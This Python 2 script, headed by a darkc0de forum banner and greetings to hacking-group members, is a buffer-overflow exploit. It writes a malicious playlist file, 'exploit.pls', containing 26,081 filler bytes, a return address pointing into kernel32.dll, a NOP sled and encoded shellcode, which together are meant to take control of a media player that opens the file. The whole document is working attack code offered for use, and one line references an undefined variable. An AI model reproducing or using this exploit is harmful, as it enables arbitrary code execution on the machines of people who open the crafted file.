#!/usr/bin/python
################################################################
#       .___             __          _______       .___        #
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    #
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   #
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   #
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   #
#        \/                  \/             \/                 #
#                   ___________   ______  _  __                #
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                #
#                 \  \___|  | \/\  ___/\     /                 #
#                  \___  >__|    \___  >\/\_/                  #
#      est.2007        \/            \/   forum.darkc0de.com   #
################################################################
# Greetz to all Darkc0de ,AI,ICW Memebers
#Shoutz to r45c4l,j4ckh4x0r,silic0n,smith,baltazar,d3hydr8,FB1H2S, lowlz,Eberly,Sumit,zerocode,dalsim,7, Anirban , Anas, Navneet ,
# Greetings to PwC India
 
 
import sys,os
print "\n|---------------------------------------------------------------|"
print "| beenudel1986[@]gmail[dot]com                                  |"
print "|   Do Visit     www.BeenuArora.com                             |"
print "|---------------------------------------------------------------|\n"
 
file=open('exploit.pls','w')
test1="\x41"*26081
test2="\x13\x44\x87\x7c" #kernel32.dll 0x7C874413
test3="\x90"*30
test4=("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca")
test=test1+test2+test3+test4
file.write(test)
print "\n Test File Created\n\n"
print shell
raw_input()
file.close()